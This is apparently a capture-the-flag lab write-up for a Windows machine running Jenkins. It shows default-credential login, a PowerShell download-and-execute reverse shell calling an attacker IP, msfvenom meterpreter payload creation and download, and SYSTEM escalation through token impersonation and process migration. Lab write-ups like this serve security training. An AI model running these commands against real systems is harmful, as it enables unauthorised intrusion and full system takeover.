@@ -1,0 +1,87 @@
+
+This machine is similar to a walkthrough and we are expected to exploit a common 
+misconfiguration in a widely used code deployment program Jenkins.
+
+This machine is a windows process so we will be introduced to Nishang
+https://github.com/samratashok/nishang
+
+Lets start!
+
+A notable few ports:
+
+80 - http
+3389 - something weird, nmap detected an ssl-cert with name 'alfred'
+8080 - http Jetty.9.4.z-SNAPSHOT
+
+http on port 80 seems empty, 8080 seems more interesting
+
+fuzzing 8080 gives me a couple interesting things:
+
+/login
+/git
+/cli
+/oops
+/subversion
+
+These folders aren't very interesting as you are required to be logged in.
+
+just attempting some cheeky login details allows us to login with admin:admin
+
+the project on jenkins is running a command on the system 'whoami'
+
+we can modify this command to execute some powershell code, specifically a reverse shell
+from the nishang toolset.
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.93.140:8000/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.93.140 -Port 1337
+
+which gets a shell on the system.
+
+
+Using this same method, we are going to download and run a meterpreter shell.
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encode x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell.exe
+
+we need to run this on the jenkins project
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.93.140:8000/shell.exe','shell.exe')"
+
+then after it has been downloaded, we need to run it. so lets start a meterpreter listener in metasploit and execute the exe through jenkins.
+
+now that we have a good shell, lets escalate some privileges.
+
+The room suggests something called 'token impersonation'
+
+Windows uses tokens to ensure accounts have the right privileges. Account tokens are assigned when users login to an account or when they are authenticated. 
+
+A token consists of:
+A User SID
+Group SID
+Privleges
+
+
+We can see our privileges by running 'whoami /priv'
+
+in this case, SeDebugPrivilege and SeImpersonatePrivilege are enabled. We can use the 
+metasploit module 'incognito' to exploit this.
+
+Once we have loaded, we can see some tokens available using 'list_tokens -g'.
+
+One interesting one is BUILTIN\Administrators
+
+so lets use this..
+
+'impersonate_token "BUILTIN\Administrators"'
+
+if it is successful , running getuid should show:
+
+Server username: NT AUTHORITY\SYSTEM
+
+Now, this is just our 'current' token, not the one assigned when we logged in, so what we 
+need to do is migrate to another process currently running at the same level so that we really
+have the right permissions for as long as we need.
+
+lets use services.exe 
+we can swap over to this in the meterpreter shell by running 
+'migrate PID-OF-PROCESS'
+
+DONE . we have root permissions through token impersonation!
